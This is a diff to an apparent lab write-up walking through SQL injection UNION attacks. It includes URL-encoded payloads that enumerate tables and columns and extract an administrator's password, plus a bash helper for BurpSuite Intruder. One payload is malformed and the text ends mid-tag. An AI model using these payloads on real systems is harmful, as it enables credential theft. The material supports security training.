@@ -77,7 +77,7 @@ As seen, we managed to get the database to regurgitate all of its tables onto th
 
 The next step was to now check for all the columns. Due to the `UNION`, we have a hard limit of **two** columns to retrieve from the table. A `users` table may contain many more than two columns. Incidentally, we may still use the `information_schema` system database to query for the columns of a table, using `information_schema.columns`. 
 Therefore, the final payload for this is:
-`'+UNION+SELECT+column_name,+NULL,FROM,information_schema.columns+WHERE+table_name='users_rrudmq'+--+`
+`'+UNION+SELECT+column_name,+NULL,FROM,information_schema.columns+WHERE+table_name%3d'users_rrudmq'+--+`
 
 Upon submitting this payload using BurpSuite, the following is what I received:
 <img src="./union-login-burp-users.png" width=400>
@@ -186,3 +186,114 @@ I launched the attack and waited patiently... only for it to succeed on attempt 
 <img src="./injection-column-number-burp.png" width=400>
 
 Just like that, the lab was finished. The query had three columns. How anti-climactic.
+
+---
+
+## 8. SQL injection UNION attack, finding a column containing text
+<img src="./text-column.png" width=400>
+
+### Description
+An extension of [7](#7-sql-injection-union-attack-determining-the-number-of-columns-returned-by-the-query). In this lab we have to find which one of the three columns is compatible with string values. As this is similar to Q7, some images that were included there will be omitted and instead be described by text.
+
+### Solution
+First, we have to repeat the attack done in Q7 to find out how many columns exist in the table of the query. This involves adding `NULL`s in the `SELECT` parameter:
+```
+SELECT NULL
+SELECT NULL, NULL
+SELECT NULL, NULL, NULL
+...
+```
+
+I used the bash script I made in Q7 to generate such a list from 1 to 250 NULLs, then loaded it into BurpSuite's Intruder. Again, the attack succeeded at 3 NULLs, meaning there were 3 columns in the queried table.
+
+Next is the meat of the question. In order to find which column is compatible with string values, we can permute an `n`-long series of NULLs, where `n` is the number of columns available on the table. The only permutation is the position of the string value that the lab wants to see, which in this case was `hZFwTl`. 
+
+Naturally, I made a bash script to help me do this, in case this is needed again in the future:
+```
+for ((i=0; i<pos; i++)); do
+	for ((j=0; j<pos; j++)); do
+		if ((i == j)); then
+			printf '%s' "'$word'"
+		else
+			printf 'NULL'
+		fi
+		if ((j < pos-1)); then
+			printf ','
+		fi
+	done
+	printf '\n'
+done > permutate.txt
+```
+
+The above script does exactly what I described and saves it to a text file, which I could load into BurpSuite's Intruder.
+
+After starting the attack, it turned out that the 2nd column was the one that was compatible with string values:
+<img src="./text-column-string.png" width=400>
+
+Lab finished!
+
+## 9. SQL injection UNION attack, retrieving data from other tables
+<img src="./login-diff-table.png" width=400>
+
+### Description
+The culmination of what I did in 1-8. The lab entails injecting queries into a query fragment for a table that is separate from where user details are stored in order to find details for the user `administrator`. The lab completes upon successful login with the account's details.
+
+### Solution
+First, I needed to figure out how many columns existed on this table. Just like I did in [7](#7-sql-injection-union-attack-determining-the-number-of-columns-returned-by-the-query), I used my bash script to generate a series of NULLs up to 250, and used BurpSuite's Intruder to automate the attack. As it turns out, there were 2 columns in the queried table.
+
+Then, I had to ensure that both the columns were compatible with strings. Similar to [8](#8-sql-injection-union-attack-finding-a-column-containing-text), I used my script to create a permutation of NULLs and the string `test`, then used Intruder to automate the attack once more. Both of the columns were compatible with strings.
+
+Now it's the easy part. I moved to BurpSuite's Repeater as I no longer needed iterative requests and quickly whipped up a request to figure out what version of SQL the server was running, like in [2](#3-sql-injection-attack-querying-the-database-type-and-version-on-oracle) and [4](#4-sql-injection-attack-querying-the-database-type-and-version-on-mysql-and-microsoft).
+I translated the query `UNION SELECT VERSION(), NULL` into the injection payload `'+UNION+SELECT+VERSION(),+NULL+--+`. Luckily, this worked first try, meaning the database was on MySQL or PostgreSQL. Upon inspecting the reflected HTML, we can find the exact version:
+```
+PostgreSQL 12.22 (Ubuntu 12.22-0ubuntu0.20.04.4) on x86_64-pc-linux-gnu, compiled by gcc (Ubuntu 9.4.0-1ubuntu1~20.04.2) 9.4.0, 64-bit
+users
+```
+
+Now that we know it's PostgreSQL, we can list all tables, find the table containing user details, and list out the columns of that table ([5](#5-sql-injection-attack-listing-the-database-contents-on-non-oracle-databases), [6](#6-sql-injeciton-attack-listing-the-database-contents-on-oracle-databases)). PostgreSQL uses the `information_schema` table to store details about table and column names, so I created the following query:
+`UNION SELECT table_name, NULL FROM information_schema.tables`
+Which I translated into the following injection payload:
+`'+UNION+SELECT+table_name,+NULL+FROM+information_schema.tables+--+`
+
+After scanning the HTML response, it turns out it was a normal-sounding name this time: `users`.
+I proceeded to find the columns of the `users` table using the following query:
+`UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='users'`
+Which I translated into the following payload:
+`'+UNION+SELECT+column_name,+NULL+FROM+information_schema.columns+WHERE+table_name%3d'users'+--+`
+
+The table had three (normal-sounding) column names: `username` `password` and `email`.
+As the last exfiltration step, I extracted the username and password of `administrator`:
+`UNION SELECT username, password FROM users WHERE username='administrator'`
+Translated into:
+`'+UNION+SELECT+username,+password+FROM+users+WHERE+username%3d'administrator'+--+`
+
+And finally, the holy grail:
+```
+<tr>
+    <th>administrator</th>
+    <td>kk35xgv9dt3mao2eu75v</td>
+</tr>
+```
+Using these details, I logged in, and the lab was done. Phew!
+
+---
+
+## 10. SQL injection UNION attack, retrieving multiple values in a single column
+<img src="./login-one-column.png" width=400>
+
+### Description
+Similarly to [9](#9-sql-injection-union-attack-retrieving-data-from-other-tables), this lab entails finding the details of the user `administrator` whilst starting out in a different table. Except, this time the lab provides to us the name of the table as well as its columns: `users` with columns `username` and `password`.
+
+### Solution
+This lab was rather simple. First, I had to repeat [7](#7-sql-injection-union-attack-determining-the-number-of-columns-returned-by-the-query) and [8](#8-sql-injection-union-attack-finding-a-column-containing-text) to find the number of columns as well as which one was compatible with text. Using my previous bash scripts and BurpSuite's Intruder, I was able to find that there were two columns, but surprisingly this time only the 2nd column was compatible with text:
+<img src="./login-one-column-burp.png" width=400>
+
+With that, I was ready to attack:
+`UNION SELECT NULL, password FROM users WHERE username='administrator'`
+Translated to:
+`'+UNION+SELECT+NULL,+password+FROM+users+WHERE+username%3d'administrator'+--+`
+PostgreSQL 12.22 (Ubuntu 12.22-0ubuntu0.20.04.4) on x86_64-pc-linux-gnu, compiled by gcc (Ubuntu 9.4.0-1ubuntu1~20.04.2) 9.4.0, 64-bit
+
+<tr>
+    <th>cpnquymz0d5ix4x8chi1</th>
+</tr
